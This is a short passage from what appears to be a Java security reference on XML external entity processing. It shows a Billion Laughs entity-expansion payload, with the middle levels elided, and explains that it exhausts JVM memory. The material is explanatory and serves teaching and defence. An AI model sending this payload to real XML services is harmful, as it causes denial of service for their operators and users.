---
source: "languages/java/xxe.md"
title: "XML External Entity (XXE) Processing"
category: "language-vuln"
language: "java"
chunk: 7
total_chunks: 10
heading: "Billion Laughs Attack (Entity Expansion DoS)"
---

## Billion Laughs Attack (Entity Expansion DoS)

```xml
<!-- Billion Laughs: causes OOM via entity expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

This creates an entity that expands to ~3 billion copies of "lol" — bringing the JVM to its knees.